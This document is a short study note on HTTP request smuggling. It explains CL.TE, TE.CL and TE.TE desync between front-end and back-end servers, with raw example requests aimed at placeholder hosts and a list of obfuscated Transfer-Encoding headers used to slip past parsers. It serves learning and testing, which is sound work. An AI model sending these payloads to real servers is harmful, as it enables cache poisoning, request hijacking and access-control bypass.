# Request smuggling 

At this point one should understand what reverse proxy, load balancing is, so basically when the frontend and the backend server processes http requests differently based on the Content-Length and Transfer-Encoding headers http request smuggling arises.

Example of content length

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Example of transfer encoding

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

## CL.TE

Frontend server uses Content-Length and backend server uses Transfer-Encoding essentially request can be smuggled like this

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

# TE.CL

Frontend server uses Transfer-Encoding and backend server uses Content-Length essentially request can be smuggled like this

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

Always remember that a line break is always \r\n ie CRLF


# TE.TE

Both frontend and backend servers use Transfer-Encoding but one of them can be processed not to process the request in such a scenario we can use the following bypasses

Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked

The attack is pretty easy to understand but its pretty hard to find tho...

